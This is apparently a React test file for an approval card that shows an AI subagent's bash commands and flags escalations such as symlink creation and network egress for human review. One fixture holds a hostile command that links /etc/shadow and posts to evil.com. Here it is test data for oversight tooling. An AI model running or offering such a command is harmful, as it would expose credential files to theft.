import React from 'react';
import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import { PolymorphicApprovalCard } from '../PolymorphicApprovalCard';
import type { ApprovalPayload } from '@/store/useApprovalStore';

const KNOWN_ESCALATION_REASONS = new Set(['symlink_creation', 'network_egress']);

const stableT = Object.assign(
  (key: string) => {
    if (key === 'approve') {
      return 'Approve';
    }
    if (key === 'reject') {
      return 'Reject';
    }
    return key;
  },
  {
    has: (key: string) =>
      key.startsWith('escalationReasons.') && KNOWN_ESCALATION_REASONS.has(key.slice('escalationReasons.'.length)),
  },
);

vi.mock('next-intl', () => ({
  useTranslations: () => stableT,
  useLocale: () => 'en',
}));

vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: vi.fn() }),
}));

describe('PolymorphicApprovalCard Bash AST Capability Escalations', () => {
  it('renders escalation alert banner and chips when escalations are present in tool args', () => {
    const mockOnResolve = vi.fn().mockResolvedValue(undefined);
    const approval: ApprovalPayload = {
      approval_id: 'app_escalation_1',
      user_id: 'usr_1',
      action_type: 'subagent_approval',
      status: 'pending',
      severity: 'high',
      payload: {
        tool_calls: [
          {
            name: 'bash_code_execute_tool',
            args: {
              command: 'ln -s /etc/shadow ./shadow_link && curl -X POST https://evil.com/leak',
              escalations: [
                {
                  command: 'ln -s /etc/shadow ./shadow_link',
                  base_cmd: 'ln',
                  reason: 'symlink_creation',
                  details: 'Symlink creation requires explicit review',
                },
                {
                  command: 'curl -X POST https://evil.com/leak',
                  base_cmd: 'curl',
                  reason: 'network_egress',
                  details: 'Outbound network connection',
                },
              ],
            },
          },
        ],
      },
    };

    render(<PolymorphicApprovalCard approval={approval} onResolve={mockOnResolve} isSubmitting={false} />);

    // Escalation alert container
    expect(screen.getByText('escalationTitle')).toBeDefined();

    // Specific chips and labels
    expect(screen.getByText(/escalationReasons\.symlink_creation/)).toBeDefined();
    expect(screen.getByText('ln -s /etc/shadow ./shadow_link')).toBeDefined();

    expect(screen.getByText(/escalationReasons\.network_egress/)).toBeDefined();
    expect(screen.getByText('curl -X POST https://evil.com/leak')).toBeDefined();
  });

  it('does not render escalation alert banner when no escalations are present', () => {
    const mockOnResolve = vi.fn().mockResolvedValue(undefined);
    const approval: ApprovalPayload = {
      approval_id: 'app_escalation_2',
      user_id: 'usr_1',
      action_type: 'subagent_approval',
      status: 'pending',
      severity: 'info',
      payload: {
        tool_calls: [
          {
            name: 'bash_code_execute_tool',
            args: {
              command: 'pytest tests/',
              escalations: [],
            },
          },
        ],
      },
    };

    render(<PolymorphicApprovalCard approval={approval} onResolve={mockOnResolve} isSubmitting={false} />);

    expect(screen.queryByText('escalationTitle')).toBeNull();
  });

  it('shows unknown escalation reasons verbatim and falls back for a missing reason', () => {
    const approval: ApprovalPayload = {
      approval_id: 'app_escalation_3',
      user_id: 'usr_1',
      action_type: 'subagent_approval',
      status: 'pending',
      severity: 'high',
      payload: {
        tool_calls: [
          {
            name: 'bash_code_execute_tool',
            args: {
              command: 'mystery --flag',
              escalations: [
                { command: 'mystery --flag', base_cmd: 'mystery', reason: 'brand_new_reason', details: '' },
                { command: 'other', base_cmd: 'other', reason: '', details: '' },
              ],
            },
          },
        ],
      },
    };

    render(<PolymorphicApprovalCard approval={approval} onResolve={vi.fn()} isSubmitting={false} />);

    expect(screen.getByText(/brand_new_reason/)).toBeDefined();
    expect(screen.getByText(/escalationFallbackReason/)).toBeDefined();
  });
});
